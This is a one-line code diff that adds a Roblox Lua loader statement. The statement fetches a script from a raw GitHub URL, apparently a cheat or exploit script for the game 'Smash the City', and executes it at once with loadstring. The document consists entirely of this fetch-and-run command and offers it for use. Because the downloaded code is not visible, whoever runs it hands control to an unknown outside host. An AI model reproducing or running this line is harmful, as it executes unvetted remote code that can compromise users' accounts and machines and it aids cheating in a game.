@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LeopardEquip39/loaders/main/loaders/upd-smash-the-city-spam6-26cen658mcr7n8.lua"))()
